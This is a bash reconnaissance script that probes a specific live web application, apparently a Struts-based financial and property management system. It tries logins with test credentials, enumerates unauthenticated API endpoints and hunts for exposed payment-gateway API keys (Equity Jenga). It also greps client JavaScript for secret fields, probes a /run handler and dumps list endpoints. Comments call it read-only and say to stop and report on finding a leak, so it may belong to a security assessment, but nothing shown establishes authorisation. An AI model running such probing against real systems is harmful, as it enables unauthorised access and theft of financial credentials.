# =========================================================
# all3.txt — ezen round 3: /live context, apikey endpoints,
# JS endpoint extraction, /run handler, store.js credentials
# All read-only. No writes.
# =========================================================

BASE="https://ezen.tysons.co.ke"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
OUT="ezen-all3-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT" && cd "$OUT" || exit 1

C()  { curl -sS -L -k -A "$UA" -m 30 "$@"; }
CS() { sleep 0.3; curl -sS -L -k -A "$UA" -m 30 "$@"; }

# =========================================================
# 1. LOGIN UNDER /live CONTEXT
# =========================================================

# --- cmd ---
CS -i "$BASE/live/login?sal.tp=login" -o live-login-get.txt
head -30 live-login-get.txt

# --- expected ---
# HTTP/1.1 200 OK
# Content-Type: text/html;charset=UTF-8
# <html>...login form... or ExtJS loader...
#
# OR 404 with a Struts namespace error if action name differs.
# OR 500 if the action exists but result mapping is broken.

# ---------------------------------------------------------

# --- cmd ---
CS -i -X POST "$BASE/live/login?sal.tp=login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'userAuthentication.username=test&userAuthentication.password=test' \
  -o live-login-post.txt
head -40 live-login-post.txt

# --- expected ---
# (a) 200 + JSON:
# {"success":false,"message":"Invalid credentials"}
#
# (b) 200 + Set-Cookie:
# Set-Cookie: JSESSIONID=...
# {"url":"/live/main.html","success":true}
# -> WORKING LOGIN. STOP. Report.
#
# (c) 500 + Struts error:
# <html>...Error...</html>
#
# (d) 404 namespace error.

# ---------------------------------------------------------

# --- cmd ---
for p in /live/login/login /live/login.action /live/j_security_check \
         /live/login.do /live/authenticate /live/index.jsp; do
  code=$(CS -o "/tmp/live_$(echo "$p" | tr '/' '_').out" -w '%{http_code}' "$BASE$p")
  echo "  $code  $p"
done

# --- expected ---
#   200  /live/login/login
#   404  /live/login.action
#   404  /live/j_security_check
#   404  /live/login.do
#   404  /live/authenticate
#   200  /live/index.jsp
#
# Any 200 = candidate login/app entry point.

# =========================================================
# 2. APIKEY / EQUITYJENGAAPIKEY DISCOVERY (READ-ONLY)
# =========================================================

# --- cmd ---
for base in /live/api /live /api; do
  for r in apikey equityjengaapikey jengaapikey; do
    for sub in list load; do
      url="$BASE$base/$r/$sub"
      code=$(CS -o "/tmp/ak_$(echo "$base$r$sub" | tr '/' '_').json" -w '%{http_code}' "$url")
      size=$(wc -c < "/tmp/ak_$(echo "$base$r$sub" | tr '/' '_').json" 2>/dev/null || echo 0)
      printf '  %-4s %-7s %s\n' "$code" "$size" "$base/$r/$sub"
      if [ "$code" = "200" ] && [ "$size" -gt 30 ]; then
        echo "      >>> BODY <<<"
        head -c 800 "/tmp/ak_$(echo "$base$r$sub" | tr '/' '_').json"; echo
      fi
    done
  done
done

# --- expected ---
#   200  <size>  /live/api/apikey/list              <- if 200, credential leak
#   404         /live/api/apikey/load
#   200  <size>  /live/api/equityjengaapikey/list   <- if 200, Jenga credentials
#   404         /live/api/equityjengaapikey/load
#   404  ...    /live/... variants
#   404  ...    /api/... variants
#
# CRITICAL: any 200 with data on apikey/list or equityjengaapikey/list
# = live payment-gateway credentials exposed unauthenticated.
# STOP and report. Do NOT probe save.

# ---------------------------------------------------------

# --- cmd ---
for base in /live/api /live /api; do
  for r in apikey equityjengaapikey jengaapikey; do
    code=$(CS -X OPTIONS -o /dev/null -w '%{http_code}' "$BASE$base/$r/save")
    echo "  OPTIONS $code  $base/$r/save"
  done
done

# --- expected ---
# OPTIONS 200 or 204  -> save method exists for that resource
# OPTIONS 404         -> no save action
# We do NOT POST to save.

# =========================================================
# 3. EXTRACT URLS FROM JS FILES
# =========================================================

# --- cmd ---
for f in app/store.js app/property/property.js app/accounts/accounts.js app/hrm/hrm.js \
         app/ext-custom-cmp.js; do
  safe=$(echo "$f" | tr '/' '_')
  [ -s "$safe" ] || CS -o "$safe" "$BASE/$f"
done

for f in *.js; do
  echo "### $f"
  grep -oE "url: *'[^']+'" "$f" 2>/dev/null | sed "s/url: *'//;s/'//" | sort -u
done | tee urls-by-file.txt

grep -hEo "url: *'[^']+'" *.js 2>/dev/null \
  | sed "s/url: *'//;s/'//" | sort -u > endpoints-from-js.txt
wc -l endpoints-from-js.txt
cat endpoints-from-js.txt

# --- expected (sample, actual will be longer) ---
# ### app_store.js
# apikey/list
# equityjengaapikey/list
# ...
# ### app_property_property.js
# property/list
# propertyunit/list
# tenant/list
# landlord/list
# ...
# ### app_accounts_accounts.js
# accounts/list
# invoices/list
# payments/list
# ...
#
# endpoints-from-js.txt will contain the full map.
# Each is a candidate for unauthenticated access like /banks/list.

# =========================================================
# 4. store.js CREDENTIAL CONTEXT
# =========================================================

# --- cmd ---
sed -n '6050,6300p' app_store.js > store-ctx-1.txt
sed -n '9700,9850p' app_store.js > store-ctx-2.txt
sed -n '10250,10350p' app_store.js > store-ctx-3.txt
for f in store-ctx-*.txt; do
  echo "=== $f ($(wc -l < "$f") lines) ==="
  head -60 "$f"
done

# --- expected ---
# store-ctx-1 (around 6085-6284):
#   Form definitions for "apikey" and "equityjengaapikey"
#   Fields: api_key, consumer_secret, consumer_key, apipassword, token, password
#   URLs: apikey/list, equityjengaapikey/list
#
# store-ctx-2 (around 9770):
#   consumer_secret field
#
# store-ctx-3 (around 10302):
#   token field
#
# These are the Jenga/Equity Bank API credential model definitions.

# ---------------------------------------------------------

# --- cmd ---
grep -nE "api_key|consumer_secret|consumer_key|apipassword|default_token|private_key|secret" \
  app_store.js | head -60 | tee store-secret-fields.txt

# --- expected ---
# 6085: {name: 'api_key'},
# 6095: url: 'apikey/list'
# 6106: {name: 'api_key'},
# 6124: {name: 'api_key'},
# 6141: {name: 'api_key'},
# 6227: {name: 'password'},
# 6228: {name: 'default_token'},
# 6274: {name: 'password'},
# 6275: {name: 'api_key'},
# 6284: url: 'equityjengaapikey/list'
# 9770: {name: 'consumer_secret'},
# 9813: {name: 'password'},
# 9836: {name: 'apipassword'},
# 10302: {name: 'token'},

# =========================================================
# 5. /run HANDLER
# =========================================================

# --- cmd ---
CS -i "$BASE/run" -o run-get.txt
head -40 run-get.txt

# --- expected ---
# HTTP/1.1 200 OK
# Content-Type: text/html;charset=UTF-8
# Content-Length: <N>          (earlier: 8266)
# <html>... actual body ...
#
# Body is distinct from SPA shell and 404 page -> real handler.

# ---------------------------------------------------------

# --- cmd ---
CS -i -X POST "$BASE/run" -o run-post.txt
head -40 run-post.txt

# --- expected ---
# HTTP/1.1 500 Internal Server Error
# Content-Length: 80
# <html><head><title>Error</title></head><body>Internal Server Error</body></html>
#
# POST reaches deeper code but errors. Try common param names.

# ---------------------------------------------------------

# --- cmd ---
CS -i -X POST "$BASE/run" -H 'Content-Type: application/json' -d '{}' -o run-post-json.txt
head -25 run-post-json.txt

# --- expected ---
# 500 or 400. Any different body = param binding discovered.

# =========================================================
# 6. PROBE ALL JS-DISCOVERED ENDPOINTS (LIST/LOAD ONLY)
# =========================================================

# --- cmd ---
while IFS= read -r ep; do
  [ -z "$ep" ] && continue
  case "$ep" in
    http*) url="$ep" ;;
    /*)    url="$BASE$ep" ;;
    *)     url="$BASE/live/$ep" ;;
  esac
  code=$(CS -o /tmp/ep_probe.json -w '%{http_code}' "$url")
  size=$(wc -c < /tmp/ep_probe.json 2>/dev/null || echo 0)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    printf '%s  %-7s %s\n' "$code" "$size" "$url"
    [ "$code" = "200" ] && [ "$size" -gt 30 ] && echo "     >>> $(head -c 300 /tmp/ep_probe.json)"
  fi
done < endpoints-from-js.txt | tee js-probe-results.txt

# --- expected (sample) ---
# 200  21   https://ezen.tysons.co.ke/live/invoices/list    {"count":0,"list":[]}
# 200  <N>  https://ezen.tysons.co.ke/live/banks/list       {"count":29,...}
# 200  <N>  https://ezen.tysons.co.ke/live/apikey/list      <- if 200, critical
# 405  <N>  https://ezen.tysons.co.ke/live/invoices/save    method not allowed
# 500  ...  https://ezen.tysons.co.ke/live/<action>         handler exists
#
# Any 200 with real data = new unauthenticated exposure.
# Any 405 = write endpoint exists (don't probe POST).

# =========================================================
# 7. BANKS LIST BOUNDS
# =========================================================

# --- cmd ---
CS -o banks-full.json "$BASE/live/api/banks/list?start=0&limit=100000"
jq -r '.count, (.list|length)' banks-full.json

# --- expected ---
# 29
# 29
#
# Confirms the table has exactly 29 rows, no hidden data behind limit.

# =========================================================
# DONE
# =========================================================
echo "Output: $(pwd)"
ls -la

# =========================================================
# INTERPRETATION CHEAT SHEET
# =========================================================
#
# /live/login?sal.tp=login 200 + Set-Cookie    -> working login, STOP
# /live/login?sal.tp=login 404 namespace err   -> try /live/login/login
# apikey/list 200 with data                    -> CRITICAL credential leak
# equityjengaapikey/list 200 with data         -> CRITICAL Jenga API creds
# endpoints-from-js.txt                        -> full endpoint map
# js-probe-results.txt non-404 lines           -> new live endpoints
# /run 200 distinct body                       -> real handler, needs analysis
# banks count==29                              -> exposure bounded
#
# Context path is /live (from Struts namespace error).
# App is Undertow (WildFly/JBoss) running Apache Struts 2.
# Model package: com.fms.common.model.*  (FMS = Financial/Facility Mgmt)
# No auth anywhere on /live/api/*.
# Access-Control-Allow-Origin: * on all responses.
#
# =========================================================
